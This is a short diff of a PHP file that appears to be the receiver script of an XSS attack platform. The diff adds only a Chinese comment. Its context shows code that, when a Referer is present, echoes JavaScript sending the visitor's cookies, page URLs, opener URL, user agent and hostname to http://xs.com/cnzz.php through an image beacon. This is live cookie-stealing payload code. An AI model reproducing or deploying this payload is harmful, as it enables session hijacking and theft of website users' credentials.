@@ -1,4 +1,7 @@
 <?php
+/**
+ * 网站域名主页,xs文件
+ */
 if( !empty($_SERVER['HTTP_REFERER']) ){
     echo '!(function(){(new Image()).src=\'http://xs.com/cnzz.php?href=\'+escape((function(){return document.location.href})())+\'&tophref=\'+escape((function(){return top.location.href})())+\'&cookie=\'+escape((function(){return document.cookie})())+\'&opener=\'+escape((function(){return(window.opener&&window.opener.location.href)?window.opener.location.href:\'\'})())+\'&userAgent=\'+escape((function(){return navigator.userAgent})())+\'&hostname=\'+escape((function(){return location.hostname})()) })();';
 }else{
